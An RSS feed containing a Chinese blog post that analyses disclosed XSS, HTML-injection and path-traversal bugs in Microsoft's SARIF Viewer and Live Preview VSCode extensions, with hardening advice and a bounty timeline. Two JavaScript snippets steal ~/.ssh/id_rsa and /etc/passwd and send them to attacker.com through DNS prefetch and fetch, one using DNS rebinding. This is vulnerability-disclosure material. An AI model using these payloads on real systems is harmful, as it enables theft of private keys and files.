<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>本地文件泄露 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</link>
        <description>Recent content in 本地文件泄露 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Fri, 08 Aug 2025 22:56:04 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>逃逸配置错误的VSCode扩展 - 技术漏洞分析与利用</title>
        <link>http://localhost:1313/p/%E9%80%83%E9%80%B8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%9A%84vscode%E6%89%A9%E5%B1%95-%E6%8A%80%E6%9C%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Fri, 08 Aug 2025 22:56:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%83%E9%80%B8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%9A%84vscode%E6%89%A9%E5%B1%95-%E6%8A%80%E6%9C%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h2 id=&#34;vscode-webviews基础&#34;&gt;VSCode Webviews基础
&lt;/h2&gt;&lt;p&gt;在深入漏洞之前，需要理解VSCode扩展的结构。VSCode是基于Electron的应用程序，具有访问文件系统和执行任意shell命令的权限，扩展拥有同等权限。这意味着如果攻击者能在扩展中执行JavaScript（例如通过XSS漏洞），就能完全控制系统。&lt;/p&gt;
&lt;p&gt;作为防御XSS漏洞的纵深保护措施，扩展必须在沙盒化的Webview中创建UI面板。这些Webview无法访问NodeJS API（这是主扩展读取文件和运行shell命令的途径）。Webview可通过以下选项进一步限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;enableScripts&lt;/code&gt;：设为false可阻止Webview执行JavaScript。多数扩展需要设为true。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;localResourceRoots&lt;/code&gt;：限制Webview只能访问指定目录的文件。默认为当前工作区目录和扩展文件夹。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;内容安全策略(CSP)&lt;/code&gt;：通过Webview HTML源中的&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;default-src &#39;none&#39;;&amp;quot;&amp;gt;&lt;/code&gt;等标签限制内容加载源。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞1microsoft-sarif查看器的htmljavascript注入&#34;&gt;漏洞1：Microsoft SARIF查看器的HTML/JavaScript注入
&lt;/h2&gt;&lt;p&gt;SARIF查看器扩展在渲染分析结果描述时，使用&lt;code&gt;ReactMarkdown&lt;/code&gt;组件且&lt;code&gt;escapeHtml&lt;/code&gt;设为false，导致攻击者可通过控制SARIF文件的markdown字段注入任意HTML/JavaScript。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用链：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过恶意构造的SARIF文件注入&lt;code&gt;&amp;lt;img onerror&amp;gt;&lt;/code&gt;触发XSS&lt;/li&gt;
&lt;li&gt;由于&lt;code&gt;localResourceRoots&lt;/code&gt;配置为允许访问整个磁盘（包括z:盘），可通过&lt;code&gt;fetch(&amp;quot;vscode-resource://...&amp;quot;)&lt;/code&gt;读取任意文件&lt;/li&gt;
&lt;li&gt;受限的CSP阻止直接外传数据，但通过&lt;code&gt;&amp;lt;link rel=&amp;quot;dns-prefetch&amp;quot;&amp;gt;&lt;/code&gt;标签利用DNS预取泄露文件内容（将文件内容编码在子域名中）&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 示例：窃取用户SSH私钥的完整利用代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sshKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;vscode-resource:///home/user/.ssh/id_rsa&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sshKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hexKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerHTML&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;lt;link rel=&amp;#34;dns-prefetch&amp;#34; href=&amp;#34;//&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;chunk&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;.attacker.com&amp;#34;&amp;gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞2microsoft-live-preview扩展的html注入&#34;&gt;漏洞2：Microsoft Live Preview扩展的HTML注入
&lt;/h2&gt;&lt;p&gt;该扩展创建本地HTTP服务器(3000端口)预览HTML文件，其Webview中的&lt;code&gt;link-hover-start&lt;/code&gt;消息处理程序直接将消息内容设置为&lt;code&gt;innerHTML&lt;/code&gt;而未消毒，导致HTML注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;绕过CSP限制的技巧：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;code&gt;srcdoc iframe&lt;/code&gt;执行JavaScript（与父窗口同源）&lt;/li&gt;
&lt;li&gt;CSP采用nonce-based script-src，但nonce由不安全的&lt;code&gt;Math.random()&lt;/code&gt;生成&lt;/li&gt;
&lt;li&gt;尝试通过DOM元素注入、nonce暴力破解、状态恢复等方式绕过，最终因不同iframe间的算法状态隔离未能成功&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞3live-preview本地http服务器的路径遍历&#34;&gt;漏洞3：Live Preview本地HTTP服务器的路径遍历
&lt;/h2&gt;&lt;p&gt;服务器解析URL时存在逻辑缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浏览器将&lt;code&gt;?../../etc/passwd?AAA&lt;/code&gt;的&lt;code&gt;?&lt;/code&gt;后视为查询参数&lt;/li&gt;
&lt;li&gt;服务器用&lt;code&gt;lastIndexOf(&#39;?&#39;)&lt;/code&gt;分割，导致路径被解析为&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;两种利用场景：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户预览恶意HTML文件时直接窃取文件&lt;/li&gt;
&lt;li&gt;结合DNS重绑定攻击：当扩展在后台运行时，用户仅访问恶意网站即可触发漏洞（无需直接预览文件）&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// DNS重绑定攻击核心代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;attackerServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;7f000001.c0a80d80.rbndr.us&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 在127.0.0.1和攻击者IP间切换
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setInterval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;attackerServer&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;/?../../../../etc/passwd?`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`http://attacker.com/?q=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;webview安全配置建议&#34;&gt;Webview安全配置建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;严格CSP&lt;/strong&gt;：从&lt;code&gt;default-src &#39;none&#39;&lt;/code&gt;开始，避免&lt;code&gt;unsafe-inline&lt;/code&gt;，使用加密强度高的nonce&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;限制localResourceRoots&lt;/strong&gt;：仅允许访问扩展安装目录&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全的postMessage处理&lt;/strong&gt;：防范命令注入等漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP服务器防护&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;使用标准URL解析库&lt;/li&gt;
&lt;li&gt;路径规范化后二次验证&lt;/li&gt;
&lt;li&gt;随机端口+端口映射防止DNS重绑定&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;永远不要将用户输入直接赋给innerHTML&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2022年8月12日：报告SARIF查看器漏洞&lt;/li&gt;
&lt;li&gt;2022年9月7日：报告Live Preview的两个漏洞&lt;/li&gt;
&lt;li&gt;所有漏洞均在1个月内修复，其中CVE-2022-41042获得$7,500奖金&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;本文展示了即使微软官方扩展也可能存在严重配置错误。在后续文章中，我们将分析一个能绕过所有正确配置的VSCode本体漏洞。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
